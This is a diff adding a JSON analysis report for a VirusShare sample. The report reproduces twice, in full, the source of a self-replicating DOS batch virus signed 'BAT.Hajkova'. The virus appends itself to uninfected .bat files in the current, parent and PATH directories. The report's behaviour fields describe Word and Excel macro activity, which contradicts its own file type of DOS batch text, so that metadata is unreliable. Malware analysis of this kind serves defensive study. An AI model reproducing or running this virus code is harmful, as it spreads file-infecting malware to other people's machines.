@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off > nul.haj\n@ctty nul > nul.haj\nif \"%1==\"/haj_p goto haj_inf\nif \"%1==\"/haj_o goto haj_loop\nfor %%a in (. .. %path%) do call %0 /haj_o %%a\ngoto haj_end\n:haj_loop\nfor %%a in (%2\\*.bat) do call %0 /haj_p %%a\ngoto haj_end\n:haj_inf\nfind \"haj\"<%2> nul\nif errorlevel 1 goto haj_st\ngoto haj_end\n:haj_st\nif \"%2==\"autoexec.bat exit >nul.haj\nset haj=%2\nfind \"haj\"<%0>>%2\nif errorlevel 1 find \"haj\"<%0.bat>>%haj%\n:haj_end\n::Venovano Pavle Hajkove :)\n::Diky Mimimu za seznameni s P. Hajkovou :)))\n::For AV's BAT.Hajkova by Worf[MIONS]"
+    },
+    "filename": "VirusShare_e155d51c366e208cc8035f52d3847725",
+    "filesize": 550,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "e155d51c366e208cc8035f52d3847725",
+        "sha1": "92fc45a3cbcf610e58158a087310b96bc4159627",
+        "sha256": "861df51b3d530bf69bb863e97b862d24b6f28a4fc8f60f75a53ee46efdf3ccbc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off > nul.haj",
+            "@ctty nul > nul.haj",
+            "if \"%1==\"/haj_p goto haj_inf",
+            "if \"%1==\"/haj_o goto haj_loop",
+            "for %%a in (. .. %path%) do call %0 /haj_o %%a",
+            "goto haj_end",
+            ":haj_loop",
+            "for %%a in (%2\\*.bat) do call %0 /haj_p %%a",
+            "goto haj_end",
+            ":haj_inf",
+            "find \"haj\"<%2> nul",
+            "if errorlevel 1 goto haj_st",
+            "goto haj_end",
+            ":haj_st",
+            "if \"%2==\"autoexec.bat exit >nul.haj",
+            "set haj=%2",
+            "find \"haj\"<%0>>%2",
+            "if errorlevel 1 find \"haj\"<%0.bat>>%haj%",
+            ":haj_end",
+            "::Venovano Pavle Hajkove :)",
+            "::Diky Mimimu za seznameni s P. Hajkovou :)))",
+            "::For AV's BAT.Hajkova by Worf[MIONS]"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265920",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
